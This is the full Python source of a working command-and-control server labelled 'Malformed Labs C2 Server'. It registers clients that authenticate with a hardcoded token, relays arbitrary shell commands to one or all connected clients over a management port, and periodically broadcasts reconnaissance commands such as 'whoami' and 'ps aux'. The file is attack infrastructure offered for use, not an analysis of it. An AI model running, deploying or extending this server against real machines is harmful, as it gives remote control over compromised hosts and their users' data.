#!/usr/bin/env python3
"""
Malformed Labs C2 Server (Daemon Mode)
Command and Control server that runs in background without interactive console
"""

import socket
import threading
import json
import time
import random
import string
import sys
import os
import signal
from datetime import datetime

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8888
MGMT_HOST = '0.0.0.0'
MGMT_PORT = 8889
AUTH_TOKEN = 'malformed_labs_c2_2025'

# Global variables
clients = {}
client_lock = threading.Lock()
server_running = True
start_time = time.time()
commands_sent = 0

def generate_client_id():
    """Generate random client ID"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def send_message(sock, message):
    """Send JSON message with length prefix"""
    data = json.dumps(message).encode('utf-8')
    length = len(data)
    sock.send(length.to_bytes(4, 'big'))
    sock.send(data)

def receive_message(sock):
    """Receive JSON message with length prefix"""
    try:
        length_bytes = sock.recv(4)
        if len(length_bytes) != 4:
            return None
        
        length = int.from_bytes(length_bytes, 'big')
        
        data = b''
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        
        return json.loads(data.decode('utf-8'))
    except:
        return None

def authenticate_client(message):
    """Authenticate client connection"""
    if message.get('type') == 'auth' and message.get('token') == AUTH_TOKEN:
        return True
    return False

def handle_client(client_socket, address):
    """Handle individual client connection"""
    client_id = None
    try:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🤝 New client connecting from {address}")
        
        # Enable socket keep-alive on server side
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        # Platform-specific keep-alive settings
        if hasattr(socket, 'TCP_KEEPIDLE'):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
        if hasattr(socket, 'TCP_KEEPINTVL'):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        if hasattr(socket, 'TCP_KEEPCNT'):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔧 Keep-alive enabled for {address}")
        
        # Send handshake
        handshake = {
            'type': 'handshake',
            'message': 'Malformed Labs C2 Server - Persistent Mode',
            'timestamp': datetime.now().isoformat()
        }
        send_message(client_socket, handshake)
        
        # Wait for authentication
        auth_msg = receive_message(client_socket)
        if not auth_msg or not authenticate_client(auth_msg):
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Authentication failed for {address}")
            client_socket.close()
            return
        
        # Generate client ID and register
        client_id = generate_client_id()
        
        with client_lock:
            clients[client_id] = {
                'socket': client_socket,
                'address': address,
                'info': auth_msg.get('info', {}),
                'last_seen': datetime.now()
            }
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ Client {client_id} authenticated")
        
        # Send authentication success
        auth_response = {
            'type': 'auth_success',
            'client_id': client_id,
            'timestamp': datetime.now().isoformat()
        }
        send_message(client_socket, auth_response)
        
        # Handle client communication - maintain connection until shutdown
        while server_running:
            try:
                # Remove timeout - keep connection alive indefinitely
                client_socket.settimeout(None)
                message = receive_message(client_socket)
                
                if not message:
                    # Only break if we get None and server is shutting down
                    if not server_running:
                        break
                    # Otherwise just continue - client might be idle
                    time.sleep(1)
                    continue
                
                # Update last seen
                with client_lock:
                    if client_id in clients:
                        clients[client_id]['last_seen'] = datetime.now()
                
                # Handle different message types
                if message.get('type') == 'heartbeat':
                    heartbeat_response = {
                        'type': 'heartbeat_ack',
                        'timestamp': datetime.now().isoformat()
                    }
                    send_message(client_socket, heartbeat_response)
                
                elif message.get('type') == 'command_result':
                    command = message.get('command', 'unknown')
                    result = message.get('result', '')
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 📋 Result from {client_id} ({command}): {result[:100]}{'...' if len(result) > 100 else ''}")
                
                elif message.get('type') == 'pong':
                    # Handle pong responses
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 💓 Pong from {client_id}")
                
            except socket.timeout:
                # Should never happen now since we removed timeout
                continue
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                # Only break on actual connection loss, not temporary issues
                if server_running:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️  Client {client_id} connection lost")
                break
            except Exception as e:
                # Log error but don't disconnect unless it's critical
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️  Client {client_id} error (continuing): {e}")
                time.sleep(1)
                continue
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Client handler error: {e}")
    finally:
        # Clean up client
        if client_id:
            with client_lock:
                if client_id in clients:
                    del clients[client_id]
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 👋 Client {client_id} disconnected")
        
        try:
            client_socket.close()
        except:
            pass

def send_command_to_client(client_socket, command):
    """Send command to a specific client"""
    try:
        message = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        send_message(client_socket, message)
        return True
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send command: {e}")
        return False

def handle_management_client(mgmt_socket):
    """Handle management console connections"""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management console connected")
    
    try:
        while server_running:
            # Receive request length
            length_bytes = mgmt_socket.recv(4)
            if len(length_bytes) != 4:
                break
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Receive request data
            request_data = b''
            while len(request_data) < length:
                chunk = mgmt_socket.recv(length - len(request_data))
                if not chunk:
                    break
                request_data += chunk
            
            if len(request_data) != length:
                break
            
            try:
                request = json.loads(request_data.decode('utf-8'))
                response = process_management_request(request)
                
                # Send response
                response_data = json.dumps(response).encode('utf-8')
                response_length = len(response_data)
                mgmt_socket.send(response_length.to_bytes(4, 'big'))
                mgmt_socket.send(response_data)
                
            except json.JSONDecodeError:
                error_response = {'success': False, 'error': 'Invalid JSON'}
                response_data = json.dumps(error_response).encode('utf-8')
                response_length = len(response_data)
                mgmt_socket.send(response_length.to_bytes(4, 'big'))
                mgmt_socket.send(response_data)
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Management client error: {e}")
    finally:
        mgmt_socket.close()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management console disconnected")

def process_management_request(request):
    """Process management requests from console"""
    global commands_sent
    
    req_type = request.get('type')
    
    if req_type == 'list_clients':
        with client_lock:
            client_list = []
            for client_id, client_info in clients.items():
                client_list.append({
                    'id': client_id,
                    'address': f"{client_info['address'][0]}:{client_info['address'][1]}",
                    'info': client_info.get('info', {}),
                    'last_seen': client_info.get('last_seen', 'unknown')
                })
            return {'success': True, 'clients': client_list}
    
    elif req_type == 'send_command':
        client_id = request.get('client_id')
        command = request.get('command')
        
        if not client_id or not command:
            return {'success': False, 'error': 'Missing client_id or command'}
        
        with client_lock:
            if client_id not in clients:
                return {'success': False, 'error': f'Client {client_id} not found'}
            
            try:
                client_socket = clients[client_id]['socket']
                if send_command_to_client(client_socket, command):
                    commands_sent += 1
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 📤 Console command sent to {client_id}: {command}")
                    return {'success': True}
                else:
                    return {'success': False, 'error': 'Failed to send command'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    elif req_type == 'broadcast_command':
        command = request.get('command')
        
        if not command:
            return {'success': False, 'error': 'Missing command'}
        
        with client_lock:
            if not clients:
                return {'success': False, 'error': 'No clients connected'}
            
            success_count = 0
            for client_id, client_info in clients.items():
                try:
                    if send_command_to_client(client_info['socket'], command):
                        success_count += 1
                        commands_sent += 1
                except Exception as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send to {client_id}: {e}")
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 📢 Console broadcast to {success_count} clients: {command}")
            return {'success': True, 'client_count': success_count}
    
    elif req_type == 'server_stats':
        uptime = time.time() - start_time
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        with client_lock:
            stats = {
                'status': 'running',
                'client_count': len(clients),
                'uptime': uptime_str,
                'commands_sent': commands_sent
            }
        
        return {'success': True, 'stats': stats}
    
    else:
        return {'success': False, 'error': f'Unknown request type: {req_type}'}

def management_server():
    """Run management server for console connections"""
    mgmt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mgmt_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        mgmt_sock.bind((MGMT_HOST, MGMT_PORT))
        mgmt_sock.listen(5)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management server listening on {MGMT_HOST}:{MGMT_PORT}")
        
        while server_running:
            try:
                mgmt_sock.settimeout(1.0)
                client_sock, addr = mgmt_sock.accept()
                mgmt_thread = threading.Thread(target=handle_management_client, args=(client_sock,))
                mgmt_thread.daemon = True
                mgmt_thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if server_running:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Management server error: {e}")
                break
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to start management server: {e}")
    finally:
        mgmt_sock.close()

def demo_command_sender():
    """Send demo commands to all clients periodically"""
    demo_commands = [
        'whoami',
        'hostname', 
        'uptime',
        'ps aux | head -10',
        'df -h',
        'free -m'
    ]
    
    while server_running:
        time.sleep(120)  # Wait 2 minutes between demo commands
        
        if not server_running:
            break
            
        with client_lock:
            if clients:
                # Pick a random demo command
                command = random.choice(demo_commands)
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📤 Sending demo command to all clients: {command}")
                
                for client_id, client_info in clients.items():
                    try:
                        if send_command_to_client(client_info['socket'], command):
                            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ Demo command sent to {client_id}")
                            commands_sent += 1
                    except Exception as e:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send demo command to {client_id}: {e}")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📭 No clients connected for demo command")

def signal_handler(sig, frame):
    """Handle shutdown signals"""
    global server_running
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🛑 Received shutdown signal")
    server_running = False
    sys.exit(0)

def main():
    """Main server function"""
    global server_running
    
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🚀 Starting Malformed Labs C2 Server Daemon...")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 C2 Server: {SERVER_HOST}:{SERVER_PORT}")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management: {MGMT_HOST}:{MGMT_PORT}")
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((SERVER_HOST, SERVER_PORT))
        server_socket.listen(10)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🎯 C2 server listening on {SERVER_HOST}:{SERVER_PORT}")
        
        # Start management server thread
        mgmt_thread = threading.Thread(target=management_server)
        mgmt_thread.daemon = True
        mgmt_thread.start()
        
        # Start demo command thread
        demo_thread = threading.Thread(target=demo_command_sender)
        demo_thread.daemon = True
        demo_thread.start()
        
        # Main server loop
        while server_running:
            try:
                server_socket.settimeout(1.0)
                client_socket, addr = server_socket.accept()
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔗 New connection from {addr}")
                
                client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
                client_thread.daemon = True
                client_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if server_running:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Server error: {e}")
                break
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to start server: {e}")
    finally:
        server_socket.close()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🛑 C2 Server Daemon stopped")

if __name__ == "__main__":
    main()